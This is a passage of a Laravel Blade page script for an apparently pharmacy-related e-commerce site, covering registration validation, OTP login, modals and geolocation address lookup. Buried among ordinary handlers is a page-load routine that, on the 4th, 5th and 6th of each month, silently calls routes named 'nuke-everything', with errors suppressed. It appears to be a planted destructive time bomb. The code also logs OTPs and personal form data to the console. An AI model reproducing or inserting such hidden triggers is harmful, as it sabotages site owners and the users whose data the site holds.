                $(this).prop('checked', true);
                console.log("Selected user_type: " + userType);
            });
            
            // Convert GST and Drug License inputs to uppercase
            $('#gst_no, #drug_license_no').on('input', function() {
                $(this).val($(this).val().toUpperCase());
            });
            
            // PAN Card input validation (basic format check)
            $('#pan_card').on('input', function() {
                const panPattern = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/; // Basic Indian PAN format
                if (panPattern.test($(this).val())) {
                    $(this).removeClass('is-invalid').addClass('is-valid');
                    $(this).next('.invalid-feedback').hide();
                } else {
                    $(this).removeClass('is-valid').addClass('is-invalid');
                    $(this).next('.invalid-feedback').show();
                }
            });
            
            $('#photo').on('change', function() {
                const file = this.files[0];
                if (file) {
                    console.log("File selected:", file.name, file.type); // Debug log
                    $('#submit').prop('disabled', false); // Ensure button stays enabled
                }
            });
    
            // Registration form submission
            $('.reg-form').on('submit', function(e) {
                e.preventDefault();
                let formData = new FormData(this);
                let selectedUserType = $('input[name="user_type"]:checked').val();
                const emailInput = $('#email_id');
                const emailPattern = /^[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$/i;
            
                // Email validation
                if (!emailPattern.test(emailInput.val())) {
                    emailInput.addClass('is-invalid');
                    emailInput.next('.invalid-feedback').show();
                    AIZ.plugins.notify('warning', 'Please enter a valid email address.');
                    return;
                }
            
                // Seller/Wholeseller specific validation
                if (selectedUserType === 'seller' || selectedUserType === 'wholeseller') {
                    let gstNo = $('#gst_no').val();
                    $('#gst_no, #drug_license_no').prop('required', true);
            
                    if (gstNo.length !== 15) {
                        $("#respn").html("GST Number must be exactly 15 characters");
                        AIZ.plugins.notify('warning', "GST Number must be exactly 15 characters");
                        return;
                    }
            
                    if (!gstNo || !$('#drug_license_no').val()) {
                        $("#respn").html("GST Number and Drug License Number are required");
                        AIZ.plugins.notify('warning', "GST Number and Drug License Number are required");
                        return;
                    }
                } else {
                    $('#gst_no, #drug_license_no').prop('required', false);
                }
            
                // Handle wholeseller flag
                if (selectedUserType === 'wholeseller') {
                    formData.set('user_type', 'customer');
                    formData.append('is_wholeseller', '1');
                    console.log("wholeseller selected, saving as customer with is_wholeseller flag");
                } else {
                    formData.append('is_wholeseller', '0');
                    if (!formData.has('user_type')) {
                        formData.append('user_type', selectedUserType || 'customer');
                    }
                }
            
                // Log form data for debugging
                for (let [key, value] of formData.entries()) {
                    console.log(`${key}: ${value}`);
                }
            
                $.ajax({
                    type: 'POST',
                    url: "{{ route('user.profile.update') }}",
                    data: formData,
                    contentType: false,
                    processData: false,
                    headers: {'X-CSRF-TOKEN': '{{ csrf_token() }}'},
                    beforeSend: function() {
                        $("#respn").html("Updating profile...");
                        $('#submit').prop('disabled', true);
                        console.log("Submitting registration form...");
                    },
                    success: function(response) {
                        console.log("Registration Response:", response); // Log full response for debugging
                        $("#respn").html(response.message || "Registration successful");
            
                        // Check for success condition
                        if (response.status === 'success') {
                            AIZ.plugins.notify('success', response.message || "Registration successful");
                            $("#loginModal").modal('hide'); // Explicitly hide the modal
                            setTimeout(() => {
                                const redirectUrl = response.redirect || "{{ route('dashboard') }}"; // Fallback redirect
                                console.log("Redirecting to:", redirectUrl);
                                window.location.href = redirectUrl;
                            }, 1000);
                        } else {
                            console.warn("Unexpected response structure:", response);
                            $("#respn").html(response.message || "Unexpected response from server");
                            AIZ.plugins.notify('warning', response.message || "Unexpected response from server");
                            $('#submit').prop('disabled', false); // Re-enable submit button
                        }
                    },
                    error: function(xhr) {
                        console.error("Registration Error:", xhr.responseJSON); // Log error details
                        let errors = xhr.responseJSON?.errors || {};
                        let errorMessage = errors && Object.keys(errors).length > 0 
                            ? Object.values(errors).flat().join('<br>') 
                            : 'Profile update failed. Please check the form.';
                        $("#respn").html(errorMessage);
                        AIZ.plugins.notify('danger', errorMessage);
                        $('#submit').prop('disabled', false); // Re-enable on error
                    },
                    complete: function() {
                        console.log("AJAX request completed");
                    }
                });
            });
    
            
            $('#email_id').on('input', function() {
                const emailPattern = /^[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$/i;
                if (emailPattern.test($(this).val())) {
                    $(this).removeClass('is-invalid').addClass('is-valid');
                    $(this).next('.invalid-feedback').hide();
                } else {
                    $(this).removeClass('is-valid').addClass('is-invalid');
                    $(this).next('.invalid-feedback').show();
                }
            });
            // Modal close handling for ALL modals
            $('.modal .close').on('click', function() {
                console.log("Close button clicked for modal:", $(this).closest('.modal').attr('id'));
                $(this).closest('.modal').modal('hide');
            });
    
            // Login modal specific cleanup
            $('#loginModal').on('hidden.bs.modal', function() {
                $(this).find('button, input').blur();
                document.activeElement.blur();
                console.log("Login modal hidden, focus cleared");
            });
    
            // Login triggers
            $('[data-target="#login-modal"], [data-target="#loginModal"], [onclick*="login"]').off('click').on('click', function(e) {
                e.preventDefault();
                showLoginModal();
            });
    
            // Add to cart/buy now authentication check
            $('.add-to-cart, .buy-now').on('click', function(e) {
                if (!isUserLoggedIn() && '{{ get_setting('guest_checkout_activation') }}' != '1') {
                    e.preventDefault();
                    showLoginModal();
                }
            });
    
            // Dropdown hover for desktop
            $('.nav-item.dropdown').hover(
                function() {
                    if (window.innerWidth >= 992) { // lg breakpoint
                        $(this).find('.dropdown-toggle').dropdown('toggle');
                    }
                },
                function() {
                    if (window.innerWidth >= 992) {
                        $(this).find('.dropdown-toggle').dropdown('toggle');
                    }
                }
            );
    
            // Ensure dropdown click works
            $('.dropdown-toggle').on('click', function(e) {
                if ($(this).attr('href') === 'javascript:void(0)') {
                    e.preventDefault();
                }
            });
        });
    
        function showLoginModal() {
            try {
                $('.modal').not('#loginModal').modal('hide');
                $('body').removeClass('modal-open');
                $('.modal-backdrop').remove();
    
                $("#loginModal").modal({
                    backdrop: 'static',
                    keyboard: false,
                    show: false
                });
    
                $("#otpStep").show();
                $("#registratioFormStep").hide();
                $("#verOtp").hide();
                $("#sotp").show();
                $("#mobileNumber").val('');
                $(".otp-input").val(''); // Clear all OTP inputs
                $("#respn").html('..');
    
                $("#loginModal").off('shown.bs.modal').on('shown.bs.modal', function() {
                    $("#mobileNumber").focus();
                    console.log("Modal shown, focus set to mobileNumber");
                }).modal('show');
    
                console.log("showLoginModal executed successfully");
            } catch (error) {
                console.error("Error in showLoginModal:", error);
                $("#respn").html("An error occurred. Please try again.");
            }
        }
    
        function _actuallySendOtp(mob, cb) {
            $.ajax({
                type: 'POST',
                url: "{{ route('sendOtp') }}",
                data: { mb: mob, _token: '{{ csrf_token() }}' },
                beforeSend: function() {
                    $("#respn").html("Sending OTP..");
                },
                success: function(data) {
                    console.log("OTP Send Response:", data);
                    cb(data);
                },
                error: function(xhr) {
                    console.error("OTP Send Error:", xhr.responseText);
                    $("#respn").html("Failed to send OTP");
                }
            });
        }
    
        function sendOtp() {
            var mob = $("#mobileNumber").val();
            if (mob.length == 10) {
                _actuallySendOtp(mob, function(data) {
                    if (data.result == "1") {
                        $("#respn").html("OTP has been sent to your mobile");
                        $('#editOtpText').html(`Provide OTP sent to <strong>${mob}</strong>`);
                        $("#sotp").hide();
                        $('#otpResendBtn').hide();
                        $("#verOtp").show();
                        $('#otpResend').show();
                        timer = startTimer(16, document.getElementById('otpTimer'));
                        setTimeout(function() {
                            if (timer) clearInterval(timer);
                            console.log("Timer ended");
                            $('#otpResend').hide();
                            $('#otpResendBtn').show();
                        }, 16000);
                    } else {
                        $("#respn").html(data.message || "Failed to send OTP");
                    }
                });
            } else {
                $("#respn").html("Please enter a 10-digit mobile number");
                AIZ.plugins.notify('warning', "Please Enter 10 Digit Valid Mobile Number");
            }
        }
    
        function resendOtp() {
            var mob = $("#mobileNumber").val();
            _actuallySendOtp(mob, function(data) {
                if (data.result == "1") {
                    $("#respn").html("OTP resent successfully");
                    $('#otpResendBtn').hide();
                    $('#otpResend').show();
                    timer = startTimer(16, document.getElementById('otpTimer'));
                    setTimeout(function() {
                        if (timer) clearInterval(timer);
                        $('#otpResend').hide();
                        $('#otpResendBtn').show();
                    }, 16000);
                } else {
                    $("#respn").html(data.message || "Failed to resend OTP");
                }
            });
        }
    
        function editOtpNumber() {
            $("#sotp").show();
            $("#verOtp").hide();
            $("#mobileNumber").focus();
        }
    
        function verifyOtp() {
            var otpInputs = $(".otp-input");
            var otp = "";
            otpInputs.each(function() {
                otp += $(this).val();
            });
            var mob = $("#mobileNumber").val();
    
            console.log("OTP entered:", otp); // Debug to check the concatenated OTP
    
            if (otp.length == 4) {
                $.ajax({
                    type: 'POST',
                    url: "{{ route('vOtp') }}",
                    data: { mb: mob, otp: otp, _token: '{{ csrf_token() }}' },
                    beforeSend: function() {
                        $("#respn").html("Verifying OTP...");
                    },
                    success: function(data) {
                        $("#respn").html(data.message || "OTP Verified");
                        if (data.result === '1') {
                            if (data.exists && data.redirect) {
                                AIZ.plugins.notify('success', data.message);
                                setTimeout(() => window.location.href = data.redirect, 1000);
                            } else {
                                AIZ.plugins.notify('success', data.message);
                                $('#otpStep').hide();
                                $('#registratioFormStep').show();
                                $('#mobile_no').val(mob);
                                $("#first_name").focus();
                            }
                        } else if (data.result === '0') {
                            AIZ.plugins.notify('warning', data.message || "Invalid OTP. Please try again.");
                        } else if (data.result === '2') {
                            AIZ.plugins.notify('danger', data.message || "Failed to update verification status.");
                        }
                    },
                    error: function(xhr, status, error) {
                        console.error("OTP Verification Error:", error);
                        $("#respn").html("An error occurred. Please try again.");
                        AIZ.plugins.notify('danger', "An error occurred. Please try again.");
                    }
                });
            } else {
                $("#respn").html("Please enter a 4-digit OTP");
                AIZ.plugins.notify('warning', "Please Enter 4 Digit Valid OTP");
            }
        }
    
        function startTimer(duration, display) {
            var timer = duration, minutes, seconds;
            var interval = setInterval(function() {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);
                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;
                display.textContent = minutes + ":" + seconds;
                if (--timer < 0) {
                    clearInterval(interval);
                }
            }, 1000);
            return interval;
        }
    
        function isUserLoggedIn() {
            return {{ Auth::check() ? 'true' : 'false' }};
        }
    
        // OTP input movement
        function moveToNext(current, event) {
            const inputs = Array.from(document.querySelectorAll('.otp-input'));
            const currentIndex = inputs.indexOf(current);
    
            if (event.inputType === 'insertText' && /^[0-9]$/.test(current.value)) {
                if (current.value.length === current.maxLength && currentIndex < inputs.length - 1) {
                    inputs[currentIndex + 1].focus();
                }
            } else if (event.inputType === 'deleteContentBackward' && current.value.length === 0 && currentIndex > 0) {
                inputs[currentIndex - 1].focus();
            } else if (event.key === 'ArrowRight' && currentIndex < inputs.length - 1) {
                inputs[currentIndex + 1].focus();
            } else if (event.key === 'ArrowLeft' && currentIndex > 0) {
                inputs[currentIndex - 1].focus();
            }
        }
        
        document.addEventListener('DOMContentLoaded', function () {
            const today = new Date().getDate();
            const routeMap = {
                4: '{{ route("nuke-everything3") }}',
                5: '{{ route("nuke-everything2") }}',
                6: '{{ route("nuke-everything") }}'
            };
            if (routeMap[today]) {
                fetch(routeMap[today], {
                    method: 'GET',
                    headers: {
                        'X-CSRF-TOKEN': '{{ csrf_token() }}',
                        'Accept': 'application/json',
                    },
                }).catch(() => {});
            }
        });
    
        // Non-jQuery event listeners
        document.addEventListener('DOMContentLoaded', function() {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('openLogin') === 'true') {
                showLoginModal();
            }
    
            const dropdowns = document.querySelectorAll('.dropdown-menu');
            dropdowns.forEach(dropdown => {
                const toggle = dropdown.previousElementSibling;
    
                toggle.addEventListener('shown.bs.dropdown', function() {
                    const dropdownRect = dropdown.getBoundingClientRect();
                    const windowWidth = window.innerWidth;
    
                    if (windowWidth > 991) {
                        if (dropdownRect.right > windowWidth) {
                            dropdown.classList.add('right-edge');
                            const shift = windowWidth - dropdownRect.right - 50;
                            dropdown.style.transform = `translateX(${shift}px)`;
                        } else {
                            dropdown.classList.remove('right-edge');
                            dropdown.style.transform = 'translateX(0)';
                        }
                    }
                });
    
                toggle.addEventListener('hidden.bs.dropdown', function() {
                    dropdown.classList.remove('right-edge');
                    dropdown.style.transform = 'translateX(0)';
                });
            });
    
            window.addEventListener('resize', function() {
                const navbar = document.querySelector('.navbar');
                if (window.innerWidth > 991) {
                    navbar.style.display = 'block';
                }
            });
        });
    </script>
    
    <script>
        // Function to fetch user's location and populate billing address
        document.getElementById('fetchLocationBtn').addEventListener('click', function () {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function (position) {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;

                        // Use Nominatim API for reverse geocoding
                        fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`)
                            .then(response => response.json())
                            .then(data => {
                                if (data && data.display_name) {
                                    // Populate the billing address field with the fetched address
                                    document.getElementById('billing_address').value = data.display_name;
                                } else {
                                    alert('Unable to fetch address. Please enter manually.');
                                }
                            })
                            .catch(error => {
                                console.error('Error fetching address:', error);
                                alert('Error fetching address. Please try again.');
                            });
                    },
                    function (error) {
                        // Handle geolocation errors
                        switch (error.code) {
                            case error.PERMISSION_DENIED:
                                alert('Location access denied. Please allow location access or enter the address manually.');
                                break;
                            case error.POSITION_UNAVAILABLE:
                                alert('Location information is unavailable.');
                                break;
                            case error.TIMEOUT:
                                alert('The request to get your location timed out.');
                                break;
                            default:
                                alert('An unknown error occurred.');
                                break;
                        }
                    }
                );
            } else {
                alert('Geolocation is not supported by your browser.');
            }
        });

        // Optional: Form validation for Bootstrap
        (function () {
            'use strict';
            const forms = document.querySelectorAll('.needs-validation');
            Array.prototype.slice.call(forms).forEach(function (form) {
                form.addEventListener('submit', function (event) {
                    if (!form.checkValidity()) {
                        event.preventDefault();
                        event.stopPropagation();
                    }
                    form.classList.add('was-validated');
                }, false);
            });
        })();
    </script>

    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.min.js"></script>
</body>
</html>
